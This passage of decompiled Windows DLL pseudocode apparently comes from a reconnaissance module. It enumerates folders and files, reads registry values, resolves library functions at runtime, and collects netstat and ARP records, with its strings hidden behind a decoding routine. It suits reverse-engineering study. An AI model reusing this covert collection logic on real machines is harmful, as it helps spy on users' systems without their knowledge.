      for ( i = (bool *)(this + 8095); ; i += 32 )
      {
        v10 = v16;
        if ( v16 >= v20 )
          v10 = v20;
        if ( (unsigned int)ProcAddress >= v10 )
          break;
        lstrcpynA((LPSTR)i - 31, *v8, 30);
        v11 = v8[3] == (LPCSTR)4;
        v8 += 11;
        ProcAddress = (FARPROC)((char *)ProcAddress + 1);
        *i = v11;
      }
    }
    else
    {
LABEL_16:
      *(_DWORD *)(this + 8060) = GetLastError();
    }
    free(Block);
    if ( v18 )
      ((void (__stdcall *)(int))v17)(v18);
    if ( hModule )
      FreeLibrary(hModule);
  }
  else
  {
    *(_DWORD *)(this + 8060) = GetLastError();
  }
}

//----- (10009CC0) --------------------------------------------------------
DWORD __thiscall sub_10009CC0(int *this)
{
  int v1; // ebx
  DWORD result; // eax
  int *v4; // esi
  HANDLE hFindFile; // [esp+8h] [ebp-80h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-7Ch] BYREF
  CHAR pszPath[264]; // [esp+14Ch] [ebp+C4h] BYREF

  v1 = 0;
  if ( SHGetSpecialFolderPathA(0, pszPath, 35, 0) )
  {
    PathRemoveFileSpecA(pszPath);
    PathRemoveFileSpecA(pszPath);
    PathAddBackslashA(pszPath);
    lstrcatA(pszPath, asc_1001E324);
    hFindFile = FindFirstFileA(pszPath, &FindFileData);
    if ( hFindFile == (HANDLE)-1 )
    {
      result = GetLastError();
      this[3216] = result;
    }
    else
    {
      v4 = this + 3225;
      do
      {
        if ( lstrcmpA(FindFileData.cFileName, asc_1001E328)
          && lstrcmpA(FindFileData.cFileName, asc_1001E32C)
          && (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          lstrcpynA((LPSTR)v4 - 32, FindFileData.cFileName, 30);
          *v4 = sub_100022D7((__int64 *)&FindFileData.ftLastWriteTime);
          ++v1;
          v4 += 9;
        }
      }
      while ( v1 < 15 && FindNextFileA(hFindFile, &FindFileData) );
      return FindClose(hFindFile);
    }
  }
  else
  {
    result = GetLastError();
    this[3216] = result;
  }
  return result;
}

//----- (10009DED) --------------------------------------------------------
unsigned __int8 __thiscall sub_10009DED(CHAR *this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  unsigned __int8 result; // al
  const CHAR *v7; // [esp-Ch] [ebp-3Ch]
  const CHAR *v8; // [esp-Ch] [ebp-3Ch]
  CHAR String2[32]; // [esp+Ch] [ebp-24h] BYREF

  v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001E330);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E34C);
  if ( sub_1000273E(HKEY_LOCAL_MACHINE, v2, v7, (LPBYTE)String2, 30) )
    lstrcpynA(this + 13408, String2, 30);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001E388);
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001E3D0);
  if ( sub_1000273E(HKEY_LOCAL_MACHINE, v3, v8, (LPBYTE)String2, 30) )
    lstrcpynA(this + 13470, String2, 30);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001E414);
  if ( sub_1000273E(HKEY_CLASSES_ROOT, v4, 0, (LPBYTE)String2, 30) )
    lstrcpynA(this + 13439, String2, 30);
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E3A4);
  result = sub_1000273E(HKEY_CLASSES_ROOT, v5, 0, (LPBYTE)String2, 30);
  if ( result )
    return (unsigned __int8)lstrcpynA(this + 13501, String2, 30);
  return result;
}

//----- (10009EF5) --------------------------------------------------------
unsigned __int8 __thiscall sub_10009EF5(CHAR *this)
{
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  unsigned __int8 result; // al
  const CHAR *v6; // [esp-Ch] [ebp-24h]
  const CHAR *v7; // [esp-Ch] [ebp-24h]
  const CHAR *v8; // [esp-Ch] [ebp-24h]
  CHAR String2; // [esp+Ch] [ebp-Ch] BYREF
  int v10; // [esp+Dh] [ebp-Bh]
  __int16 v11; // [esp+11h] [ebp-7h]

  String2 = 0;
  v10 = 0;
  v11 = 0;
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001E444);
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E478);
  if ( sub_1000273E(HKEY_LOCAL_MACHINE, v2, v6, (LPBYTE)&String2, 6) )
    lstrcpynA(this + 13532, &String2, 6);
  v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001E45C);
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001E4C0);
  if ( sub_1000273E(HKEY_LOCAL_MACHINE, v3, v7, (LPBYTE)&String2, 6) )
    lstrcpynA(this + 13539, &String2, 6);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001E504);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001E520);
  result = sub_1000273E(HKEY_LOCAL_MACHINE, v4, v8, (LPBYTE)&String2, 6);
  if ( result )
    return (unsigned __int8)lstrcpynA(this + 13546, &String2, 6);
  return result;
}

//----- (10009FDE) --------------------------------------------------------
DWORD __thiscall sub_10009FDE(char *this)
{
  const char *v2; // eax
  const char *v3; // eax
  DWORD result; // eax
  int v5; // edi
  char *v6; // ebx
  size_t v7; // eax
  size_t v8; // [esp-4h] [ebp-130h]
  HANDLE hFindFile; // [esp+8h] [ebp-124h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-120h] BYREF
  char Destination[84]; // [esp+14Ch] [ebp+20h] BYREF

  memset(&FindFileData, 0, sizeof(FindFileData));
  memset(Destination, 0, 81);
  v2 = (const char *)sub_1000C0E0((int)&unk_1001E564);
  v8 = strlen(v2);
  v3 = (const char *)sub_1000C0E0((int)&unk_1001E58C);
  strncpy(Destination, v3, v8);
  hFindFile = FindFirstFileA(Destination, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
  {
    result = GetLastError();
    *((_DWORD *)this + 3389) = result;
  }
  else
  {
    v5 = 0;
    v6 = this + 13560;
    do
    {
      if ( lstrcmpA(FindFileData.cFileName, asc_1001E5B4) && lstrcmpA(FindFileData.cFileName, asc_1001E5B8) )
      {
        if ( strlen(FindFileData.cFileName) >= 0x50 )
          v7 = 80;
        else
          v7 = strlen(FindFileData.cFileName);
        strncpy(v6, FindFileData.cFileName, v7);
        ++v5;
        v6 += 81;
      }
    }
    while ( FindNextFileA(hFindFile, &FindFileData) && v5 < 150 );
    result = GetLastError();
    *((_DWORD *)this + 3389) = result;
    if ( result == 18 )
      return FindClose(hFindFile);
  }
  return result;
}

//----- (1000A139) --------------------------------------------------------
DWORD __thiscall sub_1000A139(_DWORD *this)
{
  sub_1000986D(this);
  sub_100098B8(this);
  sub_100099F2((int)this);
  sub_10009A73((int)this);
  sub_10009ADC((CHAR *)this);
  sub_10009B59((int)this);
  sub_10009CC0(this);
  sub_10009DED((CHAR *)this);
  sub_10009EF5((CHAR *)this);
  return sub_10009FDE((char *)this);
}

//----- (1000A181) --------------------------------------------------------
int sub_1000A181()
{
  return 7184;
}

//----- (1000A187) --------------------------------------------------------
char __thiscall sub_1000A187(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x1C10 )
    return 0;
  memcpy(a2, (const void *)(this + 24), 0x1C10u);
  return 1;
}

//----- (1000A1AC) --------------------------------------------------------
char __thiscall sub_1000A1AC(int this)
{
  const CHAR *v2; // eax
  HMODULE LibraryA; // eax
  const CHAR *v5; // eax
  FARPROC ProcAddress; // eax
  const CHAR *v7; // eax
  FARPROC v8; // eax
  const CHAR *v9; // eax
  FARPROC v10; // eax

  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001E5EC);
  LibraryA = LoadLibraryA(v2);
  *(_DWORD *)(this + 8) = LibraryA;
  if ( !LibraryA )
    return 0;
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001E610);
  ProcAddress = GetProcAddress(*(HMODULE *)(this + 8), v5);
  *(_DWORD *)(this + 12) = ProcAddress;
  if ( ProcAddress )
  {
    v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001E630);
    v8 = GetProcAddress(*(HMODULE *)(this + 8), v7);
    *(_DWORD *)(this + 16) = v8;
    if ( v8 )
    {
      v9 = (const CHAR *)sub_1000C0E0((int)&unk_1001E650);
      v10 = GetProcAddress(*(HMODULE *)(this + 8), v9);
      *(_DWORD *)(this + 20) = v10;
      if ( v10 )
        return 1;
    }
  }
  if ( *(_DWORD *)(this + 8) )
  {
    FreeLibrary(*(HMODULE *)(this + 8));
    *(_DWORD *)(this + 8) = 0;
  }
  return 0;
}

//----- (1000A236) --------------------------------------------------------
void __thiscall sub_1000A236(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-24h]

  v2 = (void *)this[3];
  *this = &mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';
  j__free(v2);
  this[3] = 0;
}
// 1001E684: using guessed type void *mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';

//----- (1000A267) --------------------------------------------------------
unsigned int __thiscall sub_1000A267(_DWORD *this, const void *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int result; // eax
  int v7; // edx
  char *v8; // edi

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001E5E9);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  result = sub_10002E1A(this);
  if ( result > a3 )
  {
    v7 = 24 * result;
    result -= a3;
    do
    {
      v8 = (char *)(v7 + this[3]);
      v7 -= 24;
      --result;
      qmemcpy(v8, v8 - 24, 0x18u);
    }
    while ( result );
  }
  qmemcpy((void *)(this[3] + 24 * a3), a2, 0x18u);
  ++this[1];
  return result;
}

//----- (1000A2D8) --------------------------------------------------------
int __thiscall sub_1000A2D8(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ecx
  int result; // eax
  char v6[24]; // [esp+Ch] [ebp-1Ch] BYREF
  unsigned int v7; // [esp+24h] [ebp-4h]
  int v8; // [esp+30h] [ebp+8h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E5EA);
  --this[1];
  v7 = a2;
  if ( a2 < sub_10002E1A(this) )
  {
    v8 = 24 * a2;
    do
    {
      v3 = this[3];
      v4 = v8;
      ++v7;
      v8 += 24;
      qmemcpy((void *)(v3 + v4), (const void *)(v3 + v4 + 24), 0x18u);
    }
    while ( v7 < sub_10002E1A(this) );
  }
  memset(v6, 0, sizeof(v6));
  result = sub_10002E1A(this);
  qmemcpy((void *)(this[3] + 24 * result), v6, 0x18u);
  return result;
}

//----- (1000A354) --------------------------------------------------------
int __thiscall sub_1000A354(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E5EB);
  return this[3] + 24 * a2;
}

//----- (1000A373) --------------------------------------------------------
int __thiscall sub_1000A373(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E60D);
  return this[3] + 24 * a2;
}

//----- (1000A392) --------------------------------------------------------
unsigned int __thiscall sub_1000A392(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E60E);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 24))(a4, this[1] - a2);
  v11 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 8))(v9, v10 + this[3]);
      ++v11;
      v10 += 24;
      result = sub_10002E1A(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1000A40E) --------------------------------------------------------
unsigned int __thiscall sub_1000A40E(_DWORD *this)
{
  unsigned int result; // eax
  int v3; // eax
  unsigned int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // edx
  char *v8; // edi
  char v9[24]; // [esp+4h] [ebp-20h] BYREF
  void *v10; // [esp+1Ch] [ebp-8h]
  unsigned int v11; // [esp+20h] [ebp-4h]

  sub_1000D728();
  v11 = 0;
  result = sub_10002E1A(this);
  if ( (result & 0xFFFFFFFE) != 0 )
  {
    do
    {
      v3 = sub_10002E1A(this);
      v4 = sub_1000D71A(v3);
      v5 = sub_10002E1A(this);
      v6 = 24 * sub_1000D71A(v5);
      v7 = this[3];
      v10 = (void *)(v7 + 24 * v4);
      qmemcpy(v9, v10, sizeof(v9));
      qmemcpy(v10, (const void *)(v6 + v7), 0x18u);
      v8 = (char *)(v6 + this[3]);
      ++v11;
      qmemcpy(v8, v9, 0x18u);
      result = (unsigned int)sub_10002E1A(this) >> 1;
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1000A492) --------------------------------------------------------
unsigned int __thiscall sub_1000A492(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int result; // eax
  int v8; // ecx
  unsigned int v9; // [esp+10h] [ebp+8h]
  int v10; // [esp+18h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 56))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(24 * v5);
  v9 = 0;
  this[1] = a2;
  result = sub_10002E1A(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      v8 = v10;
      v10 += 24;
      ++v9;
      qmemcpy((void *)(v8 + this[3]), (const void *)(v8 + a3), 0x18u);
      result = sub_10002E1A(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1000A508) --------------------------------------------------------
void __thiscall sub_1000A508(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-24h]

  v2 = (void *)this[3];
  *this = &mm::data::List<bool>::`vftable';
  j__free(v2);
  this[3] = 0;
}
// 1001E6CC: using guessed type void *mm::data::List<bool>::`vftable';

//----- (1000A539) --------------------------------------------------------
int __thiscall sub_1000A539(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E673);
  return a2 + this[3];
}

//----- (1000A555) --------------------------------------------------------
int __thiscall sub_1000A555(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E674);
  return a2 + this[3];
}

//----- (1000A571) --------------------------------------------------------
int __thiscall sub_1000A571(_DWORD *this, int a2)
{
  int result; // eax

  result = (*(int (__thiscall **)(_DWORD *, int))(*this + 24))(this, a2);
  this[1] = a2;
  return result;
}

//----- (1000A587) --------------------------------------------------------
void __thiscall sub_1000A587(_DWORD *this)
{
  *this = &mm::data::Map<NetstatAndArpCollector::NETSTAT_RECORD,bool>::`vftable';
  sub_1000A508(this + 5);
  sub_1000A236(this + 1);
}
// 1001E710: using guessed type void *mm::data::Map<NetstatAndArpCollector::NETSTAT_RECORD,bool>::`vftable';

//----- (1000A5BC) --------------------------------------------------------
BOOL __thiscall sub_1000A5BC(void *Buf1, void *Buf2)
{
  return memcmp(Buf1, Buf2, 0x18u) == 0;
}

//----- (1000A5D3) --------------------------------------------------------
bool __thiscall sub_1000A5D3(void *Buf1, void *Buf2)
{
  return memcmp(Buf1, Buf2, 0x18u) < 0;
}

//----- (1000A5EE) --------------------------------------------------------
int __thiscall sub_1000A5EE(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 32))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 32))(this + 5);
}

//----- (1000A602) --------------------------------------------------------
int __thiscall sub_1000A602(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 36))(this + 1);
}

//----- (1000A60A) --------------------------------------------------------
void __thiscall sub_1000A60A(_DWORD *this)
{
  *this = &mm::data::Set<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';
  sub_1000A587(this + 1);
}
// 1001E73C: using guessed type void *mm::data::Set<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';

//----- (1000A618) --------------------------------------------------------
int __thiscall sub_1000A618(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (1000A620) --------------------------------------------------------
int __thiscall sub_1000A620(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 32))(this + 1);
}

//----- (1000A628) --------------------------------------------------------
void __thiscall sub_1000A628(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-24h]

  v2 = (void *)this[3];
  *this = &mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';
  j__free(v2);
  this[3] = 0;
}
// 1001E764: using guessed type void *mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';

//----- (1000A659) --------------------------------------------------------
unsigned int __thiscall sub_1000A659(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int result; // eax
  int v7; // ecx
  int v8; // edx
  _DWORD *v9; // esi
  _DWORD *v10; // edi
  _DWORD *v11; // edi

  if ( a3 != sub_10002E1A(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001E676);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  result = sub_10002E1A(this);
  if ( result > a3 )
  {
    v7 = 16 * result;
    result -= a3;
    do
    {
      v8 = this[3];
      v9 = (_DWORD *)(v7 + v8 - 16);
      *(_DWORD *)(v7 + v8) = *v9++;
      *(_DWORD *)(v7 + v8 + 4) = *v9++;
      *(_DWORD *)(v7 + v8 + 8) = *v9;
      v10 = (_DWORD *)(v7 + v8 + 12);
      v7 -= 16;
      --result;
      *v10 = v9[1];
    }
    while ( result );
  }
  v11 = (_DWORD *)(this[3] + 16 * a3);
  *v11++ = *a2;
  *v11++ = a2[1];
  *v11 = a2[2];
  v11[1] = a2[3];
  ++this[1];
  return result;
}

//----- (1000A6C8) --------------------------------------------------------
int __thiscall sub_1000A6C8(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ecx
  int result; // eax
  _DWORD *v6; // edi
  unsigned int v7; // [esp+1Ch] [ebp-4h]
  int v8; // [esp+28h] [ebp+8h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E677);
  --this[1];
  v7 = a2;
  if ( a2 < sub_10002E1A(this) )
  {
    v8 = 16 * a2;
    do
    {
      v3 = this[3];
      v4 = v8;
      ++v7;
      v8 += 16;
      *(_DWORD *)(v3 + v4) = *(_DWORD *)(v3 + v4 + 16);
      *(_DWORD *)(v3 + v4 + 4) = *(_DWORD *)(v3 + v4 + 20);
      *(_DWORD *)(v3 + v4 + 8) = *(_DWORD *)(v3 + v4 + 24);
      *(_DWORD *)(v3 + v4 + 12) = *(_DWORD *)(v3 + v4 + 28);
    }
    while ( v7 < sub_10002E1A(this) );
  }
  result = sub_10002E1A(this);
  v6 = (_DWORD *)(this[3] + 16 * result);
  *v6++ = 0;
  *v6++ = 0;
  *v6 = 0;
  v6[1] = 0;
  return result;
}

//----- (1000A741) --------------------------------------------------------
int __thiscall sub_1000A741(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E678);
  return this[3] + 16 * a2;
}

//----- (1000A760) --------------------------------------------------------
int __thiscall sub_1000A760(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001E679);
  return this[3] + 16 * a2;
}

//----- (1000A77F) --------------------------------------------------------
unsigned int __thiscall sub_1000A77F(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001E67A);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 24))(a4, this[1] - a2);
  v11 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 8))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = sub_10002E1A(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1000A7FB) --------------------------------------------------------
unsigned int __thiscall sub_1000A7FB(_DWORD *this)
{
  unsigned int result; // eax
  int v3; // eax
  unsigned int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ecx
  int *v8; // edx
  _DWORD *v9; // edi
  unsigned int v10; // [esp+4h] [ebp-18h]
  int v11; // [esp+8h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+10h] [ebp-Ch]
  int v14; // [esp+14h] [ebp-8h]

  sub_1000D728();
  v10 = 0;
  result = sub_10002E1A(this);
  if ( (result & 0xFFFFFFFE) != 0 )
  {
    do
    {
      v3 = sub_10002E1A(this);
      v4 = sub_1000D71A(v3);
      v5 = sub_10002E1A(this);
      v6 = sub_1000D71A(v5);
      v7 = this[3];
      v8 = (int *)(16 * v4 + v7);
      v11 = *v8;
      v12 = v8[1];
      v13 = v8[2];
      v14 = v8[3];
      v6 *= 16;
      *v8 = *(_DWORD *)(v6 + v7);
      v8[1] = *(_DWORD *)(v6 + v7 + 4);
      v8[2] = *(_DWORD *)(v6 + v7 + 8);
      v8[3] = *(_DWORD *)(v6 + v7 + 12);
      v9 = (_DWORD *)(v6 + this[3]);
      ++v10;
      *v9++ = v11;
      *v9++ = v12;
      *v9 = v13;
      v9[1] = v14;
      result = (unsigned int)sub_10002E1A(this) >> 1;
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1000A88F) --------------------------------------------------------
unsigned int __thiscall sub_1000A88F(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int result; // eax
  int v8; // ecx
  _DWORD *v9; // edi
  unsigned int v10; // [esp+10h] [ebp+8h]
  int v11; // [esp+18h] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 56))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(16 * v5);
  v10 = 0;
  this[1] = a2;
  result = sub_10002E1A(this);
  if ( result )
  {
    v11 = 0;
    do
    {
      v8 = v11;
      v11 += 16;
      v9 = (_DWORD *)(v8 + this[3]);
      ++v10;
      *v9++ = *(_DWORD *)(v8 + a3);
      *v9++ = *(_DWORD *)(v8 + a3 + 4);
      *v9 = *(_DWORD *)(v8 + a3 + 8);
      v9[1] = *(_DWORD *)(v8 + a3 + 12);
      result = sub_10002E1A(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1000A904) --------------------------------------------------------
void __thiscall sub_1000A904(_DWORD *this)
{
  *this = &mm::data::Map<NetstatAndArpCollector::ARP_RECORD,bool>::`vftable';
  sub_1000A508(this + 5);
  sub_1000A628(this + 1);
}
// 1001E7A8: using guessed type void *mm::data::Map<NetstatAndArpCollector::ARP_RECORD,bool>::`vftable';

//----- (1000A939) --------------------------------------------------------
BOOL __thiscall sub_1000A939(void *Buf1, void *Buf2)
{
  return memcmp(Buf1, Buf2, 0x10u) == 0;
}

//----- (1000A950) --------------------------------------------------------
bool __thiscall sub_1000A950(void *Buf1, void *Buf2)
{
  return memcmp(Buf1, Buf2, 0x10u) < 0;
}

//----- (1000A96B) --------------------------------------------------------
int __thiscall sub_1000A96B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 24))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 24))(this + 5);
}

//----- (1000A983) --------------------------------------------------------
void __thiscall sub_1000A983(_DWORD *this)
{
  *this = &mm::data::Set<NetstatAndArpCollector::ARP_RECORD>::`vftable';
  sub_1000A904(this + 1);
}
// 1001E7D4: using guessed type void *mm::data::Set<NetstatAndArpCollector::ARP_RECORD>::`vftable';

//----- (1000A999) --------------------------------------------------------
BOOL __thiscall sub_1000A999(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 12))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (1000A9C3) --------------------------------------------------------
int __thiscall sub_1000A9C3(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (1000A9CB) --------------------------------------------------------
int __thiscall sub_1000A9CB(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(this[1] + 20))(this + 1, a2, 0);
  return a2;
}

//----- (1000A9E5) --------------------------------------------------------
_DWORD *__thiscall sub_1000A9E5(_DWORD *Block, char a2)
{
  sub_1000A236(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA01) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA01(_DWORD *Block, char a2)
{
  sub_1000A508(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA1D) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA1D(_DWORD *Block, char a2)
{
  sub_1000A587(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA39) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA39(_DWORD *Block, char a2)
{
  sub_1000A60A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA55) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA55(_DWORD *Block, char a2)
{
  sub_1000A628(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA71) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA71(_DWORD *Block, char a2)
{
  sub_1000A904(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AA8D) --------------------------------------------------------
_DWORD *__thiscall sub_1000AA8D(_DWORD *Block, char a2)
{
  sub_1000A983(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AAA9) --------------------------------------------------------
_DWORD *__thiscall sub_1000AAA9(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp-8h] [ebp-10h]
  int v6; // [esp-4h] [ebp-Ch]

  *this = &mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';
  this[2] = 1;
  v6 = sub_10002E1A(a2);
  v5 = a2[3];
  v3 = sub_10002E1A(a2);
  sub_1000A492(this, v3, v5, v6);
  return this;
}
// 1001E684: using guessed type void *mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable';

//----- (1000AADF) --------------------------------------------------------
int __thiscall sub_1000AADF(_DWORD *this, void *Buf1)
{
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  bool v6; // zf
  void *v7; // eax
  void *v8; // eax
  int v9; // eax
  int v11; // [esp+Ch] [ebp-4h]

  v3 = (unsigned int)sub_1000AB9B(this) >> 1;
  v4 = -1;
  v5 = sub_1000AB9B(this);
  v6 = v3 == -1;
  v11 = v5;
  if ( v3 > -1 )
  {
    do
    {
      if ( v3 >= v11 )
        break;
      v7 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
      if ( sub_1000A5BC(Buf1, v7) )
        break;
      v8 = (void *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 20))(this + 1, v3);
      if ( sub_1000A5D3(Buf1, v8) )
      {
        v11 = v3;
        v9 = v4 + v3;
      }
      else
      {
        v4 = v3;
        v9 = v11 + v3 + 1;
      }
      v3 = v9 / 2;
    }
    while ( v9 / 2 > v4 );
    v6 = v3 == v4;
  }
  if ( v6 )
    return v4 + 1;
  return v3;
}

//----- (1000AB65) --------------------------------------------------------
_DWORD *__thiscall sub_1000AB65(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // [esp-8h] [ebp-10h]
  int v6; // [esp-4h] [ebp-Ch]

  *this = &mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';
  this[2] = 1;
  v6 = sub_10002E1A(a2);
  v5 = a2[3];
  v3 = sub_10002E1A(a2);
  sub_1000A88F(this, v3, v5, v6);
  return this;
}
// 1001E764: using guessed type void *mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable';

//----- (1000AB9B) --------------------------------------------------------
int __thiscall sub_1000AB9B(_DWORD *this)
{
  return sub_10002E1A(this + 1);
}

//----- (1000ABA3) --------------------------------------------------------
int __thiscall sub_1000ABA3(_DWORD *this, void *Buf1)
{
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  bool v6; // zf
  void *v7; // eax
  void *v8; // eax
  int v9; // eax
  int v11; // [esp+Ch] [ebp-4h]

  v3 = (unsigned int)sub_1000AB9B(this) >> 1;
  v4 = -1;
  v5 = sub_1000AB9B(this);
  v6 = v3 == -1;
  v11 = v5;
  if ( v3 > -1 )
  {
    do
    {
